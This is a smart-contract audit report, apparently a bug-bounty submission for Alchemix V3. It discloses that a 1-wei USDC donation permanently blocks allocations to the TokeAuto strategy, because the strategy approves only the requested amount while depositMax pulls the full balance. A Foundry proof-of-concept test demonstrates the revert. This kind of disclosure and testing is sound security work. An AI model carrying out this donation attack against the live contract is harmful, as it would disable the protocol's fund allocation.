# 58730 sc medium an attacker can prevent any tokenauto strategy allocation by making a donation to the vault of as little as 1 wei of underlying token

**Submitted on Nov 4th 2025 at 10:05:58 UTC by @niroh for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58730
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoUSDStrategy.sol>
* **Impacts:**
  * Smart contract unable to operate due to lack of token funds

## Description

## Brief/Intro

TokenAuto strategies (both USDC and Eth) use the router's depositMax function for deposits. depositMax tries to deposit the entire underlying token balance of the depositor, assuming the router is approved on the full balance:

```solidity
//From AutopilotRouter.sol depositMax
function depositMax(
    IAutopool vault,
    address to,
    uint256 minSharesOut
) public payable override returns (uint256 sharesOut) {
    IERC20 asset = IERC20(vault.asset());
    uint256 assetBalance = asset.balanceOf(msg.sender);
    uint256 maxDeposit = vault.maxDeposit(to);
    uint256 amount = maxDeposit < assetBalance ? maxDeposit : assetBalance;
    pullToken(asset, amount, address(this));

    approve(IERC20(vault.asset()), address(vault), amount);
    return deposit(vault, to, amount, minSharesOut);
}

//From Autopool4626.sol transferAndMint function:
baseAsset.safeTransferFrom(msg.sender, address(this), assets);
```

## Vulnerability Details

The issue is in the fact that the TokenAuto strategies only approve the given allocation amount in \_allocate:

```solidity
//From TokeAutoUSDStrategy
function _allocate(uint256 amount) internal override returns (uint256) {
        require(TokenUtils.safeBalanceOf(address(usdc), address(this)) >= amount, "Strategy balance is less than amount");
        TokenUtils.safeApprove(address(usdc), address(router), amount); //Audit Comment: only `amount` is approved
        uint256 shares = router.depositMax(autoUSD, address(this), 0);
        TokenUtils.safeApprove(address(autoUSD), address(rewarder), shares);
        rewarder.stake(address(this), shares);
        return amount;
    }
```

This means that if the strategy balance is more than the requested allocation (even by as little as one wei) the allocation transaction fails.

This enables an exploit whereby an attacker donates 1 wei of underlying token to the AutoToken strategy as soon as it is deployed. This is enough to brick any future allocation to that strategy. Since the donation can not be deallocated (as it was never allocated) nor swiped from the strategy in any way, it remains there indefinitely. Any attempt to allocate to the strategy will fail because whatever amount is attempted, the strategy balance will be 1 wei higher and therefore the allocation will fail.

## Impact Details

Inability of Auto Token strategy contract to operate as no funds can be allocated to it.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/strategies/mainnet/TokeAutoUSDStrategy.sol#L44>

## Proof of Concept

## Proof of Concept

How to run:

1. Copy the code below into the TokeAutoUSDStrategyTest contract in /v3-poc/src/test/strategies/TokeAutoUSDStrategy.t.sol
2. Change the BaseStrategyTest import to import the entire file:

```solidity
import "../libraries/BaseStrategyTest.sol";
```

3. run with `FOUNDRY_PROFILE=default forge test --fork-url https://mainnet.gateway.tenderly.co --match-test testBrickAllocation -vvv`

```solidity
function testBrickAllocation() public {
    
    uint256 initialDeposit = getTestConfig().vaultInitialDeposit;
    uint256 amountFirstAllocation = initialDeposit / 2;

    //make some USDC donation to the Strategy to brick the allocation
    deal(USDC,strategy,1);
    
    
    //Try to allocate (reverts with insufficient allowance
    vm.startPrank(allocator);
    uint256 oldAllocation = VaultV2(vault).allocation(IMYTStrategy(strategy).adapterId());
    bytes memory dataOldAlloc = abi.encode(oldAllocation);
    vm.expectRevert(bytes("ERC20: transfer amount exceeds allowance"));
    VaultV2(vault).allocate(strategy, dataOldAlloc, amountFirstAllocation);
    vm.stopPrank();

    //Try commenting out the donation to see that without it the allocation succeeds
}
```
